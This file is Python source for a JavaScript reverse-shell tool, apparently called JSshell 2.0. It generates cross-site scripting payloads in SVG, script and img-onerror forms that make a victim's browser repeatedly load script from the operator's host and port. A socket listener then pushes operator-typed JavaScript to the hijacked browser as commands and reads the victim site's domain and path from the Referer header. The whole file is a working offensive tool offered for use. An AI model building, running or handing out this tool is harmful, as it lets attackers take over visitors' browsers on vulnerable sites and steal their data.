#!/usr/bin/env python3
import socket
import sys
from requests import get
import argparse

red = '\033[1;31m'
white = '\033[1;m'
blue = '\033[1;34m'
if sys.platform == 'win32':
    white = red = blue = ''
    
if sys.version_info < (3, 0):
    input = raw_input

banner = '''%s    __              
  |(_  _ |_  _  |  |
\_|__)_> | |(/_ |  |
                      v2.0
''' % red
hp = '''JSshell using javascript code as shell commands. Also supports some commands:
help                  This help
domain                The source domain
pwd                   The source path
exit, quit            Exit the JS shell'''


parser = argparse.ArgumentParser(description='JSshell 2.0: javascript reverse shell')
parser.add_argument('-p', help='local port number (default: 4848)', dest='port', default=4848)
parser.add_argument('-s', help='local sorce address', dest='host', default='')
parser.add_argument('-g', help='generate JS reverse shell payload', dest='gene', action='store_true')
parser.add_argument('-c', help='command to execute after got shell', dest='command', default='')
parser.add_argument('-w', help='timeout for shell connection', dest='secs', default=0)

args = parser.parse_args()

host = format(args.host)
if not len(host):
    host = get('https://api.ipify.org').text
try:
    port = int(format(args.port))
    if not 0 <= port <= 65535:
        print('Invalid port %s' % port)
        quit
except:
    print('Invalid port %s' % port)
    quit
    
gene = args.gene
cmd = format(args.command)
secs = int(format(args.secs))
payload = '''
 - SVG: %s<svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//%s:%s"},999)>
%s - SCRIPT: %s<script>setInterval(function(){with(document)body.appendChild(createElement("script")).src="//%s:%s"},999)</script>
%s - IMG: %s<img src=x onerror=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//%s:%s"},999)>

''' % (blue, host, port, white, blue, host, port, white, blue, host, port)


print(banner)
if gene == True:
    print('%sPayloads:  %s' % (white, payload))
    
print('%sListening on [any] %s for incoming JS shell ...' % (white, port))
        

def shell():
    form = b'''HTTP/1.1 200 OK
Content-Type: application/javascript
Connection: close

'''
    while 1:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(('0.0.0.0', port))
        if secs != 0:
            s.settimeout(secs)
        buffer = input('%sjs-2.0%s$ ' % (red, white))
        s.listen(2)
        try:
            c, a = s.accept()
            data = c.recv(1024)
            if buffer == 'exit' or buffer == 'quit':
                c.close()
                break
            elif buffer == 'domain':
                try:
                    print(domain)
                except:
                    print('Could not get the source domain because the referer has been disabled')
            elif buffer == 'pwd':
                try:
                    print(path)
                except:
                    print('Could not get the source path because the referer has been disabled')
            elif buffer == 'help':
                print(hp)
                              
            c.send(form + buffer.encode())
            c.close()
        except KeyboardInterrupt:
            if sys.platform == 'win32':
                print('\nControl-C')
            s.close()
            break
        except Exception as msg:
            s.close()
            break
        

        
def main():
    global cookie
    global domain
    global pth
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.bind(('0.0.0.0', port))
    except socket.error as msg:
        print("Can't grab 0.0.0.0:%s with bind: Try a bigger local port number" % port)
    s.listen(2)
    
    try:
        c, addr = s.accept()
        resp = c.recv(1024).decode()
    except:
        s.close()
        main()
        
    if 'Accept' in resp and 'HTTP' in resp:
        print ('Got JS shell from [%s] port %s to %s %s' % (addr[0], addr[1], socket.gethostname(), port))
        for line in resp.split('\n'):
            if 'referer' in line.lower():
                referer = line.lower().replace('referer: ', '')
                domain = referer.split('/')[2]
                pth = '/'.join(referer.split('/')[3:])
        if len(cmd):
            c.send(cmd.encode())
            print('%s$ %s%s' % (blue, white, cmd))
        c.close()
        s.close()
        shell()
    else:
        s.close()
        main()


main()
